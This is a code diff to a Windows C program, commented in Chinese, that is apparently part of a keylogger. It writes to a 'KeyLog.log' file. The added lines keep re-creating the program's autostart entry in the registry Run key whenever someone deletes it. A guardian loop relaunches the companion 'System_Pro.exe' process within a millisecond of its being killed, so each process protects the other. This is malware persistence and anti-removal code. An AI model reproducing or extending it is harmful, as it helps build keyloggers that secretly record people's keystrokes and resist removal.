@@ -9,6 +9,9 @@
 *负责监控保护System_Pro进程，两个进程相互保护
 */
 
+
+HKEY hKey;
+
 char DIR[MAX_PATH];
 char NAME[MAX_PATH];
 char EXE_PATH[MAX_PATH];
@@ -44,6 +47,8 @@ DWORD _stdcall MyThread(LPVOID param)
 	strncat_s(Pro, "System_Pro.exe", sizeof("System_Pro.exe"));
 	while (1)
 	{
+		//持续验证开机自启注册表项是否存在不存在则写入，防止注册表项被删除
+		VerRegedit(hKey, EXE_PATH);
 		int i = 1;
 		PROCESSENTRY32 p32;
 		HANDLE hPro = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
@@ -60,6 +65,7 @@ DWORD _stdcall MyThread(LPVOID param)
 			}
 			hb = Process32Next(hPro, &p32);
 		}
+		//如果发现被关闭那就迅速创建新进程
 		if (i)
 			CreateNewProcess(Pro);
 		Sleep(1);
@@ -84,9 +90,10 @@ int WINAPI WinMain
 	memcpy(LOG_FILE, DIR, Dlen + 1);
 
 	//写入注册表，保证开机自启
-	WriteRegedit(
+	InitializeRegedit(
 		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-		EXE_PATH);
+		EXE_PATH,
+		&hKey);
 	strncat_s(LOG_FILE, "KeyLog.log", strlen("KeyLog.log"));
 	
 	HANDLE hThread = CreateThread(NULL, 0, MyThread, NULL, 0, &pid);
